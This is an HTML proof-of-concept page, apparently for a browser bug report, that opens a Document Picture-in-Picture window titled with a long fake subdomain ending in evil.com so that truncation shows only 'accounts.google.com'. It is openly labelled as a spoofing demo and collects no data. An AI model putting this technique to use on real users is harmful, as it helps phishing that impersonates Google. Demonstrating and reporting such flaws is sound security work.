<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  body { font-family: sans-serif; padding: 40px; text-align: center; }
  button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
</style>
</head>
<body>

<h2>PiP Title Bar Spoofing (Long Subdomain)</h2>
<p>Klik tombol di bawah. Perhatikan title bar PiP.</p>
<button id="startBtn">Open Spoofed PiP</button>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');

  btn.addEventListener('click', async function() {
    try {
      if (!window.documentPictureInPicture) {
        alert("Document Picture-in-Picture tidak didukung.");
        return;
      }

      const pipWindow = await documentPictureInPicture.requestWindow({
        width: 400,
        height: 300
      });

      // ============================================
      // SPOOFING TITLE BAR DENGAN SUBDOMAIN PANJANG
      // ============================================
      // Domain asli: accounts.google.com.very-long-subdomain-to-hide-real-domain.evil.com
      // Title bar mungkin terpotong, hanya menampilkan "accounts.google.com"
      
      pipWindow.document.title = "accounts.google.com.very-long-subdomain-to-hide-real-domain.evil.com";

      pipWindow.document.body.innerHTML = `
        <div style="font-family:sans-serif;text-align:center;padding:20px;">
          <h3>Google Security Verification</h3>
          <p>This PiP window is spoofing the title bar with a long subdomain.</p>
          <p style="color:#666;font-size:12px;">Check the title bar above (it may be truncated).</p>
        </div>
      `;

    } catch (e) {
      alert('Error: ' + e.message);
    }
  }, { once: true });

})();
</script>

</body>
</html>
